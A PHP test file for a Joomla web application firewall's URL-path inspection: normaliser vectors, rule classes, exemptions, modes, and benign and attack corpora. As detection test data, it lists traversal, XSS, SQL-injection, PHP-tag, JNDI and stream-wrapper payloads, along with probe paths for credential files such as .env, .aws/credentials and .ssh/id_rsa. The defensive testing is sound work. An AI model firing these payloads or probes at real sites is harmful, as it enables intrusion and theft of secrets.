<?php
/**
 * URL-path inspection (PLAN-WAF-PATH-P2.md, P2a): normaliser vectors, rule
 * classes, exemptions, modes, benign and attack corpora, performance. Included
 * by run.php after the plugin-flow tests (shares ipCheck()).
 *
 * @package     Colorpack Shield
 * @copyright   Copyright (C) 2026 COLORPACK CREATION CO., LTD. All rights reserved.
 * @license     GNU General Public License version 3 or later
 */

$pp = __DIR__ . '/../plugins/system/colorpack_shield/src';
require_once $pp . '/Waf/PathNormalizer.php';
require_once $pp . '/Waf/Rules/PathRules.php';
require_once $pp . '/Waf/Shield/PathShield.php';

use Colorpack\Plugin\System\ColorpackShield\Waf\PathNormalizer;
use Colorpack\Plugin\System\ColorpackShield\Waf\RequestData;
use Colorpack\Plugin\System\ColorpackShield\Waf\Rules\PathRules;
use Colorpack\Plugin\System\ColorpackShield\Waf\Shield\PathShield;
use Colorpack\Plugin\System\ColorpackShield\Waf\WafResult;

echo "== URL path: normaliser ==\n";

/** @return string[] sorted flags */
function pflags(string $raw): array
{
    $f = PathNormalizer::normalize($raw)['flags'];
    sort($f);

    return $f;
}

function pcanon(string $raw): string
{
    return PathNormalizer::normalize($raw)['canonical'];
}

/** Sorted "rule|mode" list for one path. */
function pth(string $path, array $opt = []): array
{
    $shield = new PathShield(
        $opt['mode'] ?? 'recommended',
        $opt['probe'] ?? 'log',
        $opt['allow'] ?? [],
        $opt['deny'] ?? [],
        $opt['tools'] ?? null
    );
    $out = [];

    foreach ($shield->inspectAll(new RequestData(['PATH' => ['path' => $path]])) as $r) {
        $out[] = $r->rule . '|' . $r->mode;
    }

    sort($out);

    return $out;
}

/** Does the path produce this rule (in this mode, or any mode when $mode is null)? */
function phas(string $path, string $rule, ?string $mode = null, array $opt = []): bool
{
    foreach (pth($path, $opt) as $x) {
        if ($mode === null ? str_starts_with($x, $rule . '|') : $x === "$rule|$mode") {
            return true;
        }
    }

    return false;
}

$thai = '/%E0%B8%82%E0%B9%88%E0%B8%B2%E0%B8%A7';

// Appendix B vectors.
foreach ([
    '/index.php/component/content/article/12-news',
    $thai,
    strtolower($thai),
    '/th/ข่าว/บทความ',
    '/some/page-with--double--hyphen',
    '/',
    '',
    '/trailing/slash/',
    '/100%25-off',
    '/c++-tutorial',
    '/media/vendor/jquery/js/jquery.min.js?5.0.0',
    '/page;jsessionid=ABC123',
] as $clean) {
    ipCheck('clean vector has no flags: ' . ($clean === '' ? '(empty)' : $clean), pflags($clean) === []);
}

foreach ([
    '/a/../x', '/index.php/../x', '/a/./b/../../c', '/index.php/%2e%2e/%2e%2e/etc/passwd',
    '/%2e%2e/x', '/a/%2E%2E/x', '/a/..', '/a/..%2fx', '/a%2f..%2fb', '/..',
] as $t) {
    ipCheck("traversal: $t", in_array('path_traversal', pflags($t), true));
}

ipCheck('double-encoded dots: path_double_encoded + path_traversal', pflags('/%252e%252e/%252e%252e/etc/passwd') === ['path_double_encoded', 'path_traversal']);
ipCheck('triple-encoded dots are peeled too', in_array('path_traversal', pflags('/%25252e%25252e/x'), true));
ipCheck('..;/ trick: param_trick + traversal', pflags('/administrator/index.php/..;/x') === ['path_param_trick', 'path_traversal']);
ipCheck('".;/" is a parameter trick as well', in_array('path_param_trick', pflags('/a/.;/b'), true));
ipCheck('overlong "/" (c0 af)', in_array('path_overlong_utf8', pflags('/..%c0%af..%c0%afetc/passwd'), true));
ipCheck('overlong "." (c0 ae)', in_array('path_overlong_utf8', pflags('/%c0%ae%c0%ae/x'), true));
ipCheck('overlong 3-byte (e0 80 ae)', in_array('path_overlong_utf8', pflags('/%e0%80%ae/x'), true));
ipCheck('overlong 4-byte (f0 80 80 ae)', in_array('path_overlong_utf8', pflags('/%f0%80%80%ae/x'), true));
ipCheck('invalid but not overlong UTF-8 (latin-1 é) is only path_bad_utf8', pflags('/caf%E9') === ['path_bad_utf8']);
ipCheck('valid Thai in either hex case is not bad UTF-8', pflags($thai) === [] && pflags(strtolower($thai)) === []);

foreach (['/a%00.jpg', '/a%0d%0aSet-Cookie:x', '/a%0aB', '/a%09b', "/a\x01b", '/a%7fb', '/a%250d%250a'] as $t) {
    ipCheck('control bytes: ' . addcslashes($t, "\0..\37"), in_array('path_ctrl', pflags($t), true));
}

ipCheck('backslash + traversal (%5c)', pflags('/a%5c..%5cb') === ['path_backslash', 'path_traversal']);
ipCheck('backslash + traversal (raw)', pflags('/a\\..\\b') === ['path_backslash', 'path_traversal']);
ipCheck('double slash at start', in_array('path_double_slash', pflags('//x'), true));
ipCheck('double slash in the middle', pflags('/a//b') === ['path_double_slash']);
ipCheck('a trailing slash is not a double slash', pflags('/a/') === []);
ipCheck('3000-character path is path_oversize', in_array('path_oversize', pflags('/' . str_repeat('a', 3000)), true));
ipCheck('2048-character path is not', pflags('/' . str_repeat('a', 2047)) === []);
ipCheck('query string is not part of the path', pflags('/index.php?x=../../etc/passwd&y=%00') === []);
ipCheck('a raw "<?php" starts the query string, so the path stops at "<"', pcanon('/x/<?php system(1)') === '/x/<');
ipCheck('fragment is cut as well', pflags('/index.php#/../x') === []);
ipCheck('absolute-form target keeps only the path', pflags('http://evil.example/a/../x') === ['path_traversal'] && pcanon('http://evil.example/a/b') === '/a/b');

// Canonical form.
ipCheck('canonical: lower-case ASCII, Thai bytes intact', pcanon('/News/ข่าว') === '/news/ข่าว');
ipCheck('canonical: dot segments and double slashes collapsed', pcanon('/a//b/./c') === '/a/b/c');
ipCheck('canonical: ..  resolved', pcanon('/a/b/../c') === '/a/c');
ipCheck('canonical: ";params" stripped from segments', pcanon('/a;x=1/b.php;.jpg') === '/a/b.php');
ipCheck('canonical: trailing slash kept', pcanon('/a/b/') === '/a/b/');
ipCheck('canonical: decoded through two layers', pcanon('/%2561') === '/a' && in_array('path_double_encoded', pflags('/%2561'), true));
ipCheck('canonical of "/" and "" is "/"', pcanon('/') === '/' && pcanon('') === '/');

// Property tests.
mt_srand(20261028);
$alphabet = ['a', 'b', 'c', '.', '.', '/', '/', ';', '\\', ' ', 'x', '-', '_', '1'];
$idem     = true;
$noThrow  = true;

for ($i = 0; $i < 3000; $i++) {
    $len = mt_rand(0, 24);
    $s   = '';

    for ($j = 0; $j < $len; $j++) {
        $s .= $alphabet[mt_rand(0, count($alphabet) - 1)];
    }

    $c1 = PathNormalizer::normalize($s)['canonical'];
    $c2 = PathNormalizer::normalize($c1)['canonical'];

    if (!str_contains($s, '\\') && $c1 !== $c2) {
        $idem = false;
        echo "  idempotence counter-example: " . json_encode($s) . " -> " . json_encode($c1) . " -> " . json_encode($c2) . "\n";
        break;
    }

    if (str_contains($c1, '..') && !str_contains($c1, '...')) {
        // ".." can only survive inside a longer segment, never as a segment.
        foreach (explode('/', $c1) as $seg) {
            if ($seg === '..') {
                $idem = false;
            }
        }
    }
}

ipCheck('analysis is capped at 8 KiB (canonical length)', strlen(pcanon('/' . str_repeat('a', 20000))) <= PathNormalizer::MAX_ANALYSED + 1 && in_array('path_oversize', pflags('/' . str_repeat('a', 20000)), true));
ipCheck('canonical form is idempotent on 3000 random paths (no ".." segment survives)', $idem);

for ($i = 0; $i < 2000; $i++) {
    $bytes = '';

    for ($j = mt_rand(0, 300); $j > 0; $j--) {
        $bytes .= chr(mt_rand(0, 255));
    }

    try {
        $r = PathNormalizer::normalize($bytes);
        pth($bytes);
        $noThrow = $noThrow && is_string($r['canonical']) && $r['canonical'][0] === '/';
    } catch (Throwable $e) {
        $noThrow = false;
    }
}

ipCheck('random bytes never throw and always give a rooted canonical path', $noThrow);

echo "== URL path: rules, exemptions, modes ==\n";

// Class A modes.
ipCheck('traversal blocks by default', phas('/a/../x', 'path_traversal', 'block'));
ipCheck('control bytes block by default', phas('/a%00.jpg', 'path_ctrl', 'block'));
ipCheck('overlong UTF-8 blocks by default', phas('/%c0%ae%c0%ae/x', 'path_overlong_utf8', 'block'));
foreach (['/%252e/x' => 'path_double_encoded', '/a//b' => 'path_double_slash', '/a\\b' => 'path_backslash', '/caf%E9' => 'path_bad_utf8', '/a/.;/b' => 'path_param_trick'] as $p => $rule) {
    ipCheck("$rule is log-only by default", phas($p, $rule, 'log'));
}

// Class B.
foreach ([
    '/index.php/<script>alert(1)</script>' => 'path_xss',
    '/index.php/%3Cscript%3Ealert(1)%3C/script%3E' => 'path_xss',
    '/x/%3Csvg%20onload=alert(1)%3E' => 'path_xss',
    '/x/"%20onerror=alert(1)' => 'path_xss',
    '/x/union%20select%201' => 'path_sqli',
    '/x/UNION%2f**%2fSELECT%201' => 'path_sqli',
    '/x/1;%20drop%20table%20users' => 'path_sqli',
    '/x/sleep(5)' => 'path_sqli',
    '/x/information_schema.tables' => 'path_sqli',
    '/x/%3C%3Fphp%20system($_GET[1]);' => 'path_php_tag',
    '/x/%3C%3F=%20`id`' => 'path_php_tag',
    '/x/%3C%3Fphp%20phpinfo()' => 'path_php_tag',
    '/x/${jndi:ldap://evil/a}' => 'path_jndi',
    '/x/%24%7Bjndi:ldap://evil/a%7D' => 'path_jndi',
    '/x/php://filter/convert.base64-encode/resource=index.php' => 'path_wrapper',
    '/x/phar://upload.jpg/a' => 'path_wrapper',
    '/x/expect://id' => 'path_wrapper',
    '/redirect/javascript:alert(1)' => 'path_wrapper',
] as $p => $rule) {
    ipCheck("$rule blocks: $p", phas($p, $rule, 'block'));
}

// Near misses of class B: nothing at all.
foreach ([
    '/news/union-select-committee', '/shop/select-from-our-range', '/blog/a--b--c', '/tag/sleep', '/blog/sleep-better-tonight',
    "/it's-here", '/products/script-writing', '/docs/onload-event-guide', '/c++/sleep()-function',
    '/events/data:2026', '/jndi-guide', '/news/select%20your%20plan%20from%20list',
] as $p) {
    ipCheck("class B leaves a normal URL alone: $p", array_filter(pth($p), static fn (string $x): bool => str_ends_with($x, '|block')) === []);
}

// Class C — PHP in data directories (log in this release).
foreach ([
    '/images/shell.php', '/images/real.PHP', '/images/%72eal.php', '/images/real.php/extra', '/images/real.php.', '/images/real.php;.jpg',
    '/images/a/b/c.phtml', '/tmp/x.phar', '/cache/x.php5', '/logs/x.inc', '/administrator/logs/error.php', '/administrator/cache/a.php',
    '/images/shell.php.jpg', '/IMAGES/Shell.PhP', '/images/real.php%20', '/images/real.php%2e',
] as $p) {
    ipCheck("class C: $p", phas($p, 'php_in_data_dir', 'log'));
}

foreach (['/images/photo.jpg', '/images/php/photo.jpg', '/images/phpbb.png', '/images/banners/a.php.png.jpg', '/cache/page.html', '/images/php-logo.svg', '/imagesphp/x'] as $p) {
    ipCheck("class C leaves alone: $p", !phas($p, 'php_in_data_dir'));
}

// Class D.
ipCheck('class D: direct PHP in a component', phas('/components/com_pay/notify.php', 'direct_php_in_code', 'log'));
ipCheck('class D: plugin / template / administrator component', phas('/plugins/system/x/y.php', 'direct_php_in_code') && phas('/templates/t/ajax.php', 'direct_php_in_code') && phas('/administrator/components/com_x/y.php', 'direct_php_in_code'));
ipCheck('class D: Joomla Update extract.php / restore.php are legitimate', !phas('/administrator/components/com_joomlaupdate/extract.php', 'direct_php_in_code') && !phas('/administrator/components/com_joomlaupdate/restore.php', 'direct_php_in_code'));
ipCheck('class D: Joomla Update finalisation.php is legitimate too (found on a real site)', !phas('/administrator/components/com_joomlaupdate/finalisation.php', 'direct_php_in_code'));
ipCheck('class D: Akeeba restore.php is legitimate', !phas('/administrator/components/com_akeebabackup/restore.php', 'direct_php_in_code') && !phas('/administrator/components/com_akeeba/restore.php', 'direct_php_in_code'));
ipCheck('class D: an entry point is not exempt in a look-alike folder', phas('/components/com_joomlaupdate/extract.php', 'direct_php_in_code'));
ipCheck('class D: the front controllers are fine', pth('/index.php') === [] && pth('/administrator/index.php') === [] && pth('/api/index.php/v1/content/articles') === []);
ipCheck('class D: static files in code folders are fine', pth('/templates/yootheme/css/theme.css') === [] && pth('/components/com_x/assets/app.js') === []);

// Class E.
foreach ([
    '/configuration.php', '/configuration.php-dist', '/configuration.php.bak', '/configuration.php~', '/htaccess.txt', '/web.config.txt', '/README.txt', '/LICENSE.txt',
    '/joomla.xml', '/administrator/manifests/files/joomla.xml', '/composer.json', '/package-lock.json', '/backup.zip', '/dump.sql', '/site.tar.gz',
    '/error_log', '/logs/error.log', '/administrator/logs/joomla_error.php.log', '/php_errorlog',
] as $p) {
    ipCheck("class E: $p", phas($p, 'joomla_internal', 'log'));
}

foreach (['/downloads/brochure.zip', '/images/archive.zip', '/news/readme', '/blog/error-log-explained', '/files/data.sql.html', '/media/system/js/core.js'] as $p) {
    ipCheck("class E leaves alone: $p", !phas($p, 'joomla_internal'));
}

// Class F.
foreach ([
    '/.env', '/.git/config', '/.svn/entries', '/.htaccess', '/.DS_Store', '/.aws/credentials', '/images/.ssh/id_rsa', '/wp-login.php', '/wp-admin/install.php', '/wp-content/plugins/x/y.php',
    '/xmlrpc.php', '/wp-config.php', '/phpinfo.php', '/info.php', '/shell.php', '/c99.php', '/adminer.php', '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
    '/vendor/composer/installed.json', '/vendor/autoload.php', '/libraries/vendor/phpunit/phpunit/phpunit', '/node_modules/x/package.json', '/cgi-bin/test.cgi', '/actuator/health', '/jmx-console/', '/manager/html', '/WEB-INF/web.xml', '/server-status',
    '/HNAP1/', '/boaform/admin/formLogin', '/owa/auth/logon.aspx', '/backup.zip', '/db.sql', '/www.tar.gz', '/index.php.bak', '/page.old.swp',
] as $p) {
    ipCheck("class F: $p", phas($p, 'scanner_probe', 'log'));
}

foreach ([
    '/.well-known/acme-challenge/AbC123', '/.well-known/security.txt', '/.well-known/pki-validation/fileauth.txt', '/.well-known/apple-app-site-association',
    '/robots.txt', '/sitemap.xml', '/sitemap-1.xml', '/sitemap.xml.gz', '/favicon.ico', '/ads.txt', '/humans.txt',
    '/media/vendor/jquery/js/jquery.min.js', '/media/vendor/bootstrap/js/bootstrap.es5.min.js', '/media/system/js/core.min.js',
    '/templates/yootheme/cache/ab/theme-9f8e7d6c.css', '/templates/yootheme/vendor/assets/uikit/dist/js/uikit.min.js',
    '/info', '/test', '/shell', '/news/info.html', '/blog/wp-login-tips', '/about-wordpress', '/vendor-list', '/media/vendor/awesomplete/css/awesomplete.css',
] as $p) {
    ipCheck("class F leaves alone: $p", array_filter(pth($p), static fn (string $x): bool => str_contains($x, 'scanner_probe')) === []);
}

ipCheck('.well-known is exempt from every location class, even for names the rules would otherwise report', pth('/.well-known/error_log') === [] && pth('/.well-known/debug.log') === [] && pth('/.well-known/x/.hidden') === []);
ipCheck('…but only at the site root (ACME lives nowhere else)', phas('/sub/.well-known/x', 'scanner_probe', 'log'));
ipCheck('.well-known is exempt from every location class', pth('/.well-known/acme-challenge/x') === [] && pth('/.well-known/anything.zip') === []);
ipCheck('…but not from traversal', phas('/.well-known/../x', 'path_traversal', 'block'));
ipCheck('…and not from injection', phas('/.well-known/%3C%3Fphp', 'path_php_tag', 'block'));

// Admin tools: exempt by default.
foreach (['/phpmyadmin/index.php', '/phpMyAdmin-5.2.1-all-languages/', '/webmail/', '/roundcube/index.php', '/pma/'] as $p) {
    ipCheck("admin tool exempt by default: $p", !phas($p, 'admin_tool_probe'));
}

ipCheck('admin tool reported when the exemption list is empty', phas('/phpmyadmin/index.php', 'admin_tool_probe', 'log', ['tools' => []]));
ipCheck('other admin tools are reported', phas('/myadmin/', 'admin_tool_probe', 'log') && phas('/mysqladmin/', 'admin_tool_probe', 'log') && phas('/pgadmin4/', 'admin_tool_probe', 'log'));
ipCheck('exemption list is honoured per tool', !phas('/myadmin/', 'admin_tool_probe', null, ['tools' => ['myadmin']]) && phas('/phpmyadmin/', 'admin_tool_probe', 'log', ['tools' => ['myadmin']]));

// Modes.
ipCheck('probe mode off silences class F', pth('/.env', ['probe' => 'off']) === [] && pth('/phpmyadmin/', ['probe' => 'off', 'tools' => []]) === []);
ipCheck('probe mode block blocks class F', phas('/.env', 'scanner_probe', 'block', ['probe' => 'block']));
ipCheck('probe mode does not touch other classes', phas('/images/x.php', 'php_in_data_dir', 'log', ['probe' => 'block']));
ipCheck('mode log: traversal is only logged', phas('/a/../x', 'path_traversal', 'log', ['mode' => 'log']) && !phas('/a/../x', 'path_traversal', 'block', ['mode' => 'log']));
ipCheck('mode log wins over probe block', phas('/.env', 'scanner_probe', 'log', ['mode' => 'log', 'probe' => 'block']));
ipCheck('mode block: log-only classes block too', phas('/images/x.php', 'php_in_data_dir', 'block', ['mode' => 'block']) && phas('/backup.zip', 'joomla_internal', 'block', ['mode' => 'block']));
ipCheck('mode block + probe off: class F stays silent', pth('/.env', ['mode' => 'block', 'probe' => 'off']) === []);
ipCheck('mode block + probe log: probes block (everything found)', phas('/.env', 'scanner_probe', 'block', ['mode' => 'block']));
ipCheck('unknown mode values behave like the defaults', pth('/a/../x', ['mode' => 'weird']) === pth('/a/../x') && pth('/.env', ['probe' => 'weird']) === pth('/.env', ['probe' => 'log']));

// Probe mode "ban": only scanner_probe escalates to MODE_BAN - admin_tool_probe (phpMyAdmin,
// webmail, …) exists to coexist with the host's own tools, not to flag attackers, so it stays
// at block even under "ban".
ipCheck('probe mode ban bans class F scanner_probe hits', phas('/.env', 'scanner_probe', 'ban', ['probe' => 'ban']));
ipCheck('probe mode ban still only blocks (not bans) admin_tool_probe', phas('/myadmin/', 'admin_tool_probe', 'block', ['probe' => 'ban']));
ipCheck('probe mode does not escalate other classes to ban', phas('/images/x.php', 'php_in_data_dir', 'log', ['probe' => 'ban']));
ipCheck('a ban finding is the one inspect() returns, ahead of a same-request block', (static function (): bool {
    $shield = new PathShield('recommended', 'ban');
    $result = $shield->inspect(new RequestData(['PATH' => ['path' => '/a/../wp-login.php']]));

    return $result->mode === WafResult::MODE_BAN && $result->rule === 'scanner_probe';
})());
ipCheck('mode log wins over probe ban, same as probe block', phas('/.env', 'scanner_probe', 'log', ['mode' => 'log', 'probe' => 'ban']));
ipCheck('mode block overrides probe ban down to a plain block', phas('/.env', 'scanner_probe', 'block', ['mode' => 'block', 'probe' => 'ban']));

// Operator lists.
$allow = ['/components/com_pay/notify.php', 're:^/shop/ipn[0-9]*\\.php$', '# a comment', '', 'not-a-path', 're:(unclosed'];
ipCheck('path_allow prefix silences class D', !phas('/components/com_pay/notify.php', 'direct_php_in_code', null, ['allow' => $allow]));
ipCheck('path_allow regex silences class D', !phas('/shop/ipn2.php', 'direct_php_in_code', null, ['allow' => $allow]) && !phas('/shop/ipn.php', 'direct_php_in_code', null, ['allow' => ['re:^/shop/ipn[0-9]*\\.php$']]));
ipCheck('path_allow entries typed in upper case still match', !phas('/components/com_pay/notify.php', 'direct_php_in_code', null, ['allow' => ['/Components/Com_Pay/Notify.php']]));
ipCheck('path_allow is case-insensitive', !phas('/Components/Com_Pay/Notify.PHP', 'direct_php_in_code', null, ['allow' => $allow]));
ipCheck('path_allow of a different path does not help', phas('/components/com_other/x.php', 'direct_php_in_code', 'log', ['allow' => $allow]));
ipCheck('invalid / malformed allow lines are ignored without error', phas('/components/com_other/x.php', 'direct_php_in_code', 'log', ['allow' => ['re:(unclosed', 'nope']]));
ipCheck('path_allow never silences traversal or injection', phas('/components/com_pay/../x', 'path_traversal', 'block', ['allow' => ['/components/']]) && phas('/components/%3C%3Fphp', 'path_php_tag', 'block', ['allow' => ['/components/']]));
ipCheck('path_allow can silence a scanner probe', pth('/.git/config', ['allow' => ['/.git/']]) === []);
ipCheck('path_extra_deny prefix blocks', phas('/private/report.pdf', 'path_extra_deny', 'block', ['deny' => ['/private/']]));
ipCheck('path_extra_deny regex blocks', phas('/a/b.tmp', 'path_extra_deny', 'block', ['deny' => ['re:\\.tmp$']]));
ipCheck('path_extra_deny is only logged in mode log', phas('/private/x', 'path_extra_deny', 'log', ['deny' => ['/private/'], 'mode' => 'log']));
ipCheck('path_extra_deny beats the exemptions', phas('/robots.txt', 'path_extra_deny', 'block', ['deny' => ['/robots.txt']]));
ipCheck('path_extra_deny does not hit other paths', !phas('/public/x', 'path_extra_deny', null, ['deny' => ['/private/']]));

// PATH_INFO / PHP_SELF carriers.
$carrier = static function (string $key, string $value): array {
    $out = [];

    foreach ((new PathShield())->inspectAll(new RequestData(['PATH' => [$key => $value]])) as $r) {
        $out[] = $r->rule . '|' . $r->mode . '|' . $r->key;
    }

    return $out;
};
ipCheck('PHP_SELF carrying a script tag is blocked', $carrier('php_self', '/index.php/"><script>alert(1)</script>') === ['path_xss|block|php_self']);
ipCheck('PATH_INFO carrying a PHP tag is blocked', $carrier('path_info', '/<?php system(1);') === ['path_php_tag|block|path_info']);
ipCheck('carriers get injection rules only (a dot-file in PATH_INFO is not a probe)', $carrier('path_info', '/.env') === [] && $carrier('php_self', '/images/x.php') === []);
ipCheck('a normal PHP_SELF is clean', $carrier('php_self', '/index.php') === [] && $carrier('path_info', '/component/content/article/12-news') === []);

// Samples and log safety.
$res = (new PathShield())->inspectAll(new RequestData(['PATH' => ['path' => "/a%0d%0aSet-Cookie:x=1"]]));
ipCheck('sample contains no CR/LF (log lines cannot be forged)', $res !== [] && !preg_match('/[\r\n]/', $res[0]->sample));
$res = (new PathShield())->inspectAll(new RequestData(['PATH' => ['path' => '/index.php?id=1%27%20union%20select%201&token=SECRET']]));
ipCheck('the query string is not inspected at all', $res === []);
$res = (new PathShield())->inspectAll(new RequestData(['PATH' => ['path' => '/.env?token=SECRET123']]));
ipCheck('the query string never reaches the sample', $res !== [] && !str_contains($res[0]->sample, 'SECRET123') && $res[0]->sample === '/.env');
$res = (new PathShield())->inspectAll(new RequestData(['PATH' => ['path' => '/images/%FF%FEx.php']]));
ipCheck('invalid UTF-8 in the sample is made printable', $res !== [] && preg_match('//u', $res[0]->sample) === 1);
ipCheck('findings carry shield=path, src=PATH, key=path', (function () {
    $r = (new PathShield())->inspectAll(new RequestData(['PATH' => ['path' => '/a/../x']]));

    return $r !== [] && $r[0]->shield === 'path' && $r[0]->source === 'PATH' && $r[0]->key === 'path';
})());
ipCheck('blocking findings come first in the list', (function () {
    $r = (new PathShield())->inspectAll(new RequestData(['PATH' => ['path' => '//images/x.php/../y']]));

    return count($r) >= 2 && $r[0]->mode === WafResult::MODE_BLOCK;
})());
ipCheck('inspect() returns the blocking finding', (new PathShield())->inspect(new RequestData(['PATH' => ['path' => '/a//b/../x.php']]))->mode === WafResult::MODE_BLOCK);
ipCheck('other sources are ignored by the path shield', (new PathShield())->inspectAll(new RequestData(['GET' => ['p' => '/a/../x'], 'HEADER' => ['Referer' => '/../x']])) === []);
ipCheck('findings per request are bounded at 6', count((new PathShield('block'))->inspectAll(new RequestData(['PATH' => ['path' => '//a\\..;/%00/%252e/%3Cscript%3E/union%20select%201/%3C%3Fphp/${jndi:x}/images/x.php/.env/%c0%af/wp-login.php']]))) === 6);

// Table consistency.
ipCheck('every normaliser flag has a rule', (function () {
    foreach ([PathNormalizer::F_TRAVERSAL, PathNormalizer::F_CTRL, PathNormalizer::F_OVERLONG, PathNormalizer::F_PARAM_TRICK, PathNormalizer::F_DOUBLE_ENC, PathNormalizer::F_BAD_UTF8, PathNormalizer::F_BACKSLASH, PathNormalizer::F_DOUBLE_SLASH, PathNormalizer::F_OVERSIZE] as $f) {
        if (!isset(PathRules::RULES[$f])) {
            return false;
        }
    }

    return true;
})());
ipCheck('every injection / location pattern has a rule and compiles', (function () {
    foreach (array_merge(PathRules::injectionPatterns(), PathRules::locationPatterns()) as $rule => $pattern) {
        if (!isset(PathRules::RULES[$rule]) || @preg_match($pattern, '') === false) {
            return false;
        }
    }

    foreach (array_merge(PathRules::exemptions(), PathRules::directEntryPoints()) as $pattern) {
        if (@preg_match($pattern, '') === false) {
            return false;
        }
    }

    return true;
})());
ipCheck('every rule has a class A–F and mode block|log', (function () {
    foreach (PathRules::RULES as [$class, $mode]) {
        if (!in_array($class, ['A', 'B', 'C', 'D', 'E', 'F'], true) || !in_array($mode, ['block', 'log'], true)) {
            return false;
        }
    }

    return true;
})());
ipCheck('class B rules all block by default; only traversal/ctrl/overlong and the operator deny list block elsewhere', (function () {
    $blocking = array_keys(array_filter(PathRules::RULES, static fn (array $r): bool => $r[1] === 'block'));
    sort($blocking);
    $expected = ['path_ctrl', 'path_extra_deny', 'path_jndi', 'path_overlong_utf8', 'path_php_tag', 'path_sqli', 'path_traversal', 'path_wrapper', 'path_xss'];

    return $blocking === $expected;
})());

echo "== URL path: corpora ==\n";

// Benign corpus: zero BLOCKS (and, for ordinary URLs, zero findings at all).
$benign = [
    '/', '/index.php', '/index.php/component/content/article/12-news', '/index.php/th/ข่าว/ประกาศ', $thai . $thai,
    '/news/2026/10/some-article-title.html', '/en/about-us/our-team', '/th/%E0%B8%9A%E0%B8%97%E0%B8%84%E0%B8%A7%E0%B8%B2%E0%B8%A1',
    '/administrator/index.php', '/administrator/index.php?option=com_content&view=articles', '/api/index.php/v1/content/articles',
    '/images/banners/photo-1.jpg', '/images/%E0%B8%82%E0%B9%88%E0%B8%B2%E0%B8%A7.jpg', '/images/my%20photo%20(1).jpg', '/images/sampledata/cassiopeia/nasa1-1200.jpg',
    '/media/system/js/core.min.js', '/media/vendor/jquery/js/jquery.min.js', '/media/templates/site/cassiopeia/css/template.min.css',
    '/templates/yootheme/cache/ab/theme-9f8e7d6c.css', '/templates/yootheme/cache/12/uikit-3f2a1b00.js', '/templates/yootheme/vendor/assets/uikit/dist/js/uikit.min.js',
    '/media/yootheme/cache/95/hero-9f8e7d6c.webp', '/images/yootheme/logo.svg', '/administrator/components/com_joomlaupdate/finalisation.php',
    '/templates/yootheme/fonts/Prompt-Regular.woff2', '/templates/yootheme/js/theme.js',
    '/.well-known/acme-challenge/6Ib8QJmC5LxkZ_Pq-3-abc', '/.well-known/security.txt', '/.well-known/pki-validation/ABCDEF0123456789.txt',
    '/robots.txt', '/sitemap.xml', '/sitemap.xml.gz', '/favicon.ico', '/ads.txt',
    '/some/page-with--double--hyphen', '/news/union-select-committee', '/shop/select-from-our-range', '/blog/sleep-better', '/docs/script-writing',
    '/administrator/components/com_joomlaupdate/extract.php', '/administrator/components/com_joomlaupdate/restore.php',
    '/phpmyadmin/index.php', '/webmail/', '/roundcube/', '/pma/',
    '/downloads/report-2026.pdf', '/files/brochure.zip', '/100%25-off', '/c++-tutorial', '/page;jsessionid=ABC123', '/trailing/slash/',
    '/contact-us?name=john&msg=select+from+union', '/search?searchword=%2e%2e%2f', '/media/vendor/fontawesome-free/webfonts/fa-solid-900.woff2',
];
$falsePos = [];

foreach ($benign as $p) {
    $f = pth($p);

    if ($f !== []) {
        $falsePos[] = $p . ' => ' . implode(',', $f);
    }
}

ipCheck('benign corpus (' . count($benign) . ' URLs): no finding at all', $falsePos === []);

foreach ($falsePos as $line) {
    echo "    false positive: $line\n";
}

ipCheck('benign corpus is clean even in "block everything" mode', (function () use ($benign) {
    foreach ($benign as $p) {
        if (pth($p, ['mode' => 'block', 'probe' => 'block']) !== []) {
            return false;
        }
    }

    return true;
})());

// Attack corpus: every URL is reported by at least one rule; the high-confidence ones are blocked.
$mustBlock = [
    '/index.php/..%2f..%2f..%2fetc/passwd', '/index.php/%2e%2e/%2e%2e/etc/passwd', '/%252e%252e/%252e%252e/etc/passwd', '/administrator/index.php/..;/x',
    '/..%c0%af..%c0%afetc/passwd', '/a%00.jpg', '/a%0d%0aSet-Cookie:x=1', '/index.php/<script>alert(1)</script>', '/x/union%20select%201,2,3',
    '/x/%3C%3Fphp%20system($_GET[1]);', '/x/%24%7Bjndi:ldap://evil/a%7D', '/x/php://filter/read=convert.base64-encode/resource=configuration.php',
    '/cgi-bin/.%2e/.%2e/.%2e/etc/passwd', '/a/b/../../../../etc/passwd', '/index.php/..\\..\\windows\\win.ini',
];

foreach ($mustBlock as $p) {
    ipCheck('attack blocked: ' . $p, array_filter(pth($p), static fn (string $x): bool => str_ends_with($x, '|block')) !== []);
}

$mustReport = [
    '/.env', '/.git/config', '/wp-login.php', '/xmlrpc.php', '/backup.zip', '/images/shell.php', '/administrator/logs/error.php', '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
    '/configuration.php.bak', '/administrator/manifests/files/joomla.xml', '/phpinfo.php', '/actuator/env', '/HNAP1/', '/.htaccess', '/server-status',
];

foreach ($mustReport as $p) {
    ipCheck('probe reported (default mode, log): ' . $p, pth($p) !== []);
}

echo "== URL path: performance ==\n";

$perf    = ['/news/2026/10/some-article-title.html', '/index.php/component/content/article/12-news', '/th/ข่าว/ประกาศ/บทความ-ใหม่', '/templates/yootheme/cache/ab/theme-9f8e7d6c.css'];
$shield  = new PathShield();
$data    = array_map(static fn (string $p): RequestData => new RequestData(['PATH' => ['path' => $p]]), $perf);
$n       = 4000;
$start   = hrtime(true);

for ($i = 0; $i < $n; $i++) {
    $shield->inspectAll($data[$i % 4]);
}

$typical = (hrtime(true) - $start) / 1000 / $n;

$worstPath = '/' . str_repeat('a/', 600) . '..%2f' . str_repeat('%252e', 100) . '/images/x.php';
$worst     = new RequestData(['PATH' => ['path' => $worstPath]]);
$start     = hrtime(true);

for ($i = 0; $i < 500; $i++) {
    $shield->inspectAll($worst);
}

$worstUs = (hrtime(true) - $start) / 1000 / 500;
printf("    typical path: %.1f µs per request, worst case (%d bytes): %.1f µs\n", $typical, strlen($worstPath), $worstUs);
ipCheck('typical path costs under 100 µs', $typical < 100);
ipCheck('worst-case path costs under 1 ms', $worstUs < 1000);

// Pathological input must not blow PCRE's backtrack limit silently into a "clean" answer.
$bomb = new RequestData(['PATH' => ['path' => '/' . str_repeat('a.', 4000) . 'php']]);
ipCheck('very long dotted path is handled without error', is_array((new PathShield())->inspectAll($bomb)));
ipCheck('PCRE did not fail on any corpus input', preg_last_error() === PREG_NO_ERROR);
